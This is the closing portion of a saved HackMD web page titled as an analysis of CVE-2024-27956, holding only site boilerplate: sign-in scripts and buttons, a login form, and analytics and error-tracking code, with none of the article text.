

<script id="gsi-client" src="./Phân tích CVE-2024-27956 - HackMD_files/client" async="" defer="" nonce=""></script>
<script nonce="">
    function handleCredentialResponse(response) {
        const form = document.getElementById('sign-in-with-google-form')
        form.children.credential.value = response.credential
        form.children.method.value = location.href.toLowerCase() === 'https://hackmd.io/settings#general' ? 'merge' : 'login'
        form.submit()
    }
    var GSI_READY = new Promise(function (resolve) {
        function initialize () {
            google.accounts.id.initialize({
                client_id: '911617723593-drikdibvvn63slfd6kbqigo8ql1no55s.apps.googleusercontent.com',
                callback: handleCredentialResponse
            })
            const loginPath = '/login'
            const joinPath = '/join'
            const renderButton = function () {
                google.accounts.id.renderButton(
                    document.getElementById('sign-in-with-google-button'),
                    { type: 'standard', width: 250 }
                )
            }
            if (location.pathname.toLowerCase() === loginPath || location.pathname.toLowerCase() === joinPath) {
                renderButton()
            } else {
                $('.signin-modal').one('shown.bs.modal', function () {
                    renderButton()
                })
            }
            resolve()
        }

        window.addEventListener('load', function () { initialize() })
    })
</script>
<form class="hidden" id="sign-in-with-google-form" action="https://hackmd.io/auth/google" method="post">
    <input type="hidden" name="credential">
    <input type="hidden" name="method">
    <input type="hidden" name="_csrf" value="ejFWFIep-unkOjvkGHVbuTENyYTGR1uA7wG0">
</form>


<div class="social-buttons-container">
    
    <div id="sign-in-with-google-button"></div>
    
    
    <a href="https://hackmd.io/auth/facebook" class="btn btn-lg btn-block btn-social btn-facebook">
        <i class="fa fa-facebook"></i> Sign in via Facebook
    </a>
    
    
    <a href="https://hackmd.io/auth/twitter" class="btn btn-lg btn-block btn-social btn-twitter">
        <i class="fa fa-twitter"></i> Sign in via Twitter
    </a>
    
    
    <a href="https://hackmd.io/auth/github" class="btn btn-lg btn-block btn-social btn-github">
        <i class="fa fa-github"></i> Sign in via GitHub
    </a>
    
    
    <a href="https://hackmd.io/auth/dropbox" class="btn btn-lg btn-block btn-social btn-dropbox">
        <i class="fa fa-dropbox"></i> Sign in via Dropbox
    </a>
    
    
    
      <a href="https://hackmd.io/@cheese00/r1hYa0hZA#" class="btn btn-block btn-social btn-web3 bg-gray-800 hocus:bg-[#2b2b2b] text-white hocus:text-white">
          <img src="./Phân tích CVE-2024-27956 - HackMD_files/wallet.svg" style="max-height: 20px; margin-top: 8px; margin-left: 6px; border: none;">
          <span class="sign-in-wallet-text">
              Sign in with Wallet
          </span>

          <div class="inline-flex items-center justify-between w-full hidden web3-wallet-info">
              <span>
                   Wallet
                   (
                    <span class="web3-wallet-address"></span>
                   )
              </span>

              <i class="fa fa-arrow-right" aria-hidden="true"></i>
          </div>
      </a>

      <small class="web3-wallet-info hidden text-left hocus:text-white underline hocus:underline block pt-2 ui-disconnect-connected-wallets text-gray-600 cursor-pointer">
          Connect another wallet
      </small>
    
</div>




    <div>
        <p>New to HackMD? <a href="https://hackmd.io/join" class="plausible-event-name=LoginModalSignUp">Sign up</a></p>
    </div>




        </div>
    </div>
</div>

    
    <script src="./Phân tích CVE-2024-27956 - HackMD_files/js"></script>
    <script nonce="">
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        let userid = (document.cookie.match('(^|; )userid=([^;]*)')||0)[2];
        gtag('config', 'G-NGVZMM6DR6', {'user_id': userid});
        
    </script>


    
<script src="./Phân tích CVE-2024-27956 - HackMD_files/bundle.min.js.tải xuống" crossorigin="anonymous"></script>
<script nonce="">
  Sentry.init({ dsn: 'https://73410f1915d84abc8b2dd1f1aabd1c82@sentry.hackmd.dev/4', environment: 'production', integrations: function (intrus) { return intrus.filter(function (itr) { return itr.name !== 'TryCatch' }) } });
  const sentryUserId = document.cookie
    .split('; ')
    .map(cookie => cookie.split('='))
    .reduce((acc, [k, v]) => k === 'userid' ? v : acc, '');
  Sentry.setUser(sentryUserId ? { id: sentryUserId } : null);
</script>


    
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KLW9Z3"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->



    <script src="./Phân tích CVE-2024-27956 - HackMD_files/i18n.js.tải xuống"></script>
     <script src="./Phân tích CVE-2024-27956 - HackMD_files/font-vendor.7631cb852a460f17d568.js.tải xuống" defer="defer"></script><script src="./Phân tích CVE-2024-27956 - HackMD_files/common-vendor.3c9a3da9f8a49f6ad878.js.tải xuống" defer="defer"></script><script src="./Phân tích CVE-2024-27956 - HackMD_files/pretty-vendor.1e65e4faa04a7ebdd05b.js.tải xuống" defer="defer"></script><script src="./Phân tích CVE-2024-27956 - HackMD_files/pretty-common.fb61aa6b71cf8200ffc1.js.tải xuống" defer="defer"></script><script src="./Phân tích CVE-2024-27956 - HackMD_files/pretty.4b82ea784de626fa8622.js.tải xuống" defer="defer"></script>

    



<script id="" text="" charset="" type="text/javascript" src="./Phân tích CVE-2024-27956 - HackMD_files/script.manual.js.tải xuống" nonce=""></script>
<script id="" text="" charset="" type="text/javascript" src="./Phân tích CVE-2024-27956 - HackMD_files/tracks.js.tải xuống" nonce=""></script>
<div class="ReactModalPortal"></div><div data-radix-popper-content-wrapper="" style="position: fixed; left: 0px; top: 0px; transform: translate(0px, 8px); min-width: max-content; will-change: transform; z-index: 1001; --radix-popper-available-width: 1448.5714111328125px; --radix-popper-available-height: 772px; --radix-popper-anchor-width: 0px; --radix-popper-anchor-height: 0px; --radix-popper-transform-origin: 0% 0px;"><div data-side="bottom" data-align="start" data-state="open" role="dialog" id="radix-1" class="z-[1001] rounded-lg border border-solid border-border-default select-none bg-background-default shadow-[0_3px_15px_0_#00000026] hidden" tabindex="-1" style="--radix-popover-content-transform-origin: var(--radix-popper-transform-origin); --radix-popover-content-available-width: var(--radix-popper-available-width); --radix-popover-content-available-height: var(--radix-popper-available-height); --radix-popover-trigger-width: var(--radix-popper-anchor-width); --radix-popover-trigger-height: var(--radix-popper-anchor-height);"><div class="ui-floating-toolbar-popover flex flex-row p-[7px]"><button class="rounded text-normal font-normal leading-normal flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled ui-selection-popover-comment ui-floating-toolbar-comment gap-1 p-[7px]" data-state="closed"><i class="inline-flex ph ph-chat-circle-dots" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i>Comment</button><button class="rounded text-normal font-normal leading-normal flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled ui-selection-popover-suggest-edit ui-floating-toolbar-suggest-edit p-[7px]" data-state="closed"><i class="inline-flex ph ph-pencil-simple-line" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><span class="ml-1 flex border-0 border-l border-solid border-background-subtle pr-1"></span><button class="rounded text-normal font-normal leading-normal flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled ui-floating-toolbar-copy-link p-[7px]" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-normal font-normal leading-normal flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled ui-floating-toolbar-paragraph-bookmark p-[7px]" data-state="closed"><span class="inline-flex ph" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"><svg width="100%" height="100%" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M9.58579 4.58579C9.96086 4.21071 10.4696 4 11 4H25C25.5304 4 26.0391 4.21071 26.4142 4.58579C26.7893 4.96086 27 5.46957 27 6V28C27 28.3635 26.8027 28.6984 26.4848 28.8746C26.1668 29.0509 25.7783 29.0407 25.47 28.848L18 24.1792L10.53 28.848C10.2217 29.0407 9.83319 29.0509 9.51523 28.8746C9.19728 28.6984 9 28.3635 9 28V6C9 5.46957 9.21071 4.96086 9.58579 4.58579ZM25 6H11L11 26.1958L17.47 22.152C17.7943 21.9493 18.2057 21.9493 18.53 22.152L25 26.1958V6Z" fill="currentColor"></path><path d="M5 5C5 4.44772 5.44772 4 6 4C6.55228 4 7 4.44772 7 5V28C7 28.5523 6.55228 29 6 29C5.44772 29 5 28.5523 5 28V5Z" fill="currentColor"></path></svg></span></button><span class="ml-1 flex border-0 border-l border-solid border-background-subtle pr-1"></span><button class="p-0 m-0 bg-transparent border-none text-5 leading-[20px]" type="button" aria-haspopup="dialog" aria-expanded="false" aria-controls="radix-0" data-state="closed"><span class="rounded text-normal font-normal leading-normal flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled ui-floating-toolbar-emoji-reply p-[7px]" role="button" data-state="closed"><i class="inline-flex ph ph-smiley" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></span></button></div></div></div><div class="ReactModalPortal"></div><span data-radix-focus-guard="" tabindex="0" style="outline: none; opacity: 0; position: fixed; pointer-events: none;"></span><div class="ReactModalPortal"></div><div class="ReactModalPortal"></div><div class="ReactModalPortal"></div><div class="ReactModalPortal"></div><div id="toasts-container-top" class="toasts-container-top"><div><div class="pointer-events-auto ml-auto mr-auto flex w-fit flex-col justify-end"></div></div><div><div class="pointer-events-auto ml-auto mr-auto flex w-fit flex-col justify-end"></div></div></div><div><div class="fixed left-0 top-0 z-[1998] h-[100dvh] w-[100dvw] transition-opacity duration-300 bg-[#fff]/80 pointer-events-none opacity-0" theme="light"></div></div><script type="text/javascript">
    var _paq = _paq || [];
    _paq.push(['setTrackingSource', 'jstc_tm']);
    _paq.push(['enableLinkTracking']);
    _paq.push(['setIpTracking', true]);
    _paq.push(['setDomains', ['hackmd.io']]);
    var userId = undefined;
    if ((typeof userId === 'string') || (typeof userId === 'number')) {
        _paq.push(['setUserId', String(userId)]);
    }
    _paq.push(['trackPageView']);
    _paq.push(['enableJSErrorTracking']);
    (function(p,i,w,ik) {
        var g=ik.createElement('script'),s=ik.getElementsByTagName('script')[0];
        _paq.push(['setTrackerUrl', p]);
        _paq.push(['setSiteId', w]);
        g.type='text/javascript';g.async=true;g.defer=true;g.src=i;s.parentNode.insertBefore(g,s);
    })('https://hackmd.piwik.pro/ppms.php','https://hackmd.containers.piwik.pro/ppms.js','8b665e66\u002D46fc\u002D4c65\u002Daef4\u002D4c3429ff4551',document)
</script>
<div class="ReactModalPortal"></div>        <script type="text/javascript">
    var _paq = _paq || [];

        _paq.push(['trackEvent', 'built-in page scroll', '25%']);
</script>
        <script type="text/javascript">
    var _paq = _paq || [];

        _paq.push(['trackEvent', 'built-in page scroll', '50%']);
</script>
        <script type="text/javascript">
    var _paq = _paq || [];

        _paq.push(['trackEvent', 'built-in page scroll', '75%']);
</script>
</body><div><div class="react-joyride"></div></div><div></div></html>